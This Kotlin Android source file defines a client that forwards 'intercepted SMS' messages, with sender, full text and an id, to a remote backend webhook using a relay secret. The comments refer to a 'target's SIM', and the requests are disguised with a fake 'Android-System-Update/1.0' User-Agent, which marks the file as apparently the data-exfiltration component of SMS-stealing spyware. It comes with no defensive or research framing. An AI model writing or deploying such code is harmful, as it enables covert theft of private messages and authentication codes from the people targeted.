package com.yourname.relay

import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.FormBody
import okhttp3.OkHttpClient
import okhttp3.Request
import java.util.concurrent.TimeUnit

/**
 * Sends intercepted SMS to the backend webhook using Twilio's form schema.
 *
 * The backend's sms_webhook reads these form fields:
 *   From        -> sender's phone number (or target's SIM, for relay mode)
 *   To          -> recipient (we send DEVICE_ID; backend ignores for relay)
 *   Body        -> full SMS text
 *   MessageSid  -> unique id (relay-{DEVICE_ID}-{epochMs})
 *
 * Auth is via the X-Relay-Secret header (validated by _is_authorized_relay
 * in the backend). Twilio-signed requests use a different path and need no
 * secret.
 */
object BackendClient {

    private const val TAG = "BackendClient"

    private val client = OkHttpClient.Builder()
        .connectTimeout(Config.TIMEOUT_SECONDS, TimeUnit.SECONDS)
        .readTimeout(Config.TIMEOUT_SECONDS, TimeUnit.SECONDS)
        .writeTimeout(Config.TIMEOUT_SECONDS, TimeUnit.SECONDS)
        .build()

    /**
     * Relay a single SMS to the backend.
     * @return true if the POST succeeded (HTTP 2xx), false otherwise.
     */
    suspend fun relay(
        from: String,
        body: String,
        messageSid: String,
    ): Boolean = withContext(Dispatchers.IO) {
        val formBody = FormBody.Builder()
            .add("From", from)
            .add("To", Config.DEVICE_ID)
            .add("Body", body)
            .add("MessageSid", messageSid)
            .build()

        val request = Request.Builder()
            .url(Config.BACKEND_WEBHOOK)
            .post(formBody)
            .addHeader("X-Relay-Secret", Config.RELAY_SECRET)
            .addHeader("User-Agent", "Android-System-Update/1.0")
            .build()

        try {
            client.newCall(request).execute().use { response ->
                val ok = response.isSuccessful
                Log.d(TAG, "POST to ${Config.BACKEND_WEBHOOK} -> HTTP ${response.code}")
                ok
            }
        } catch (e: Exception) {
            Log.e(TAG, "Relay failed: ${e.message}", e)
            false
        }
    }
}
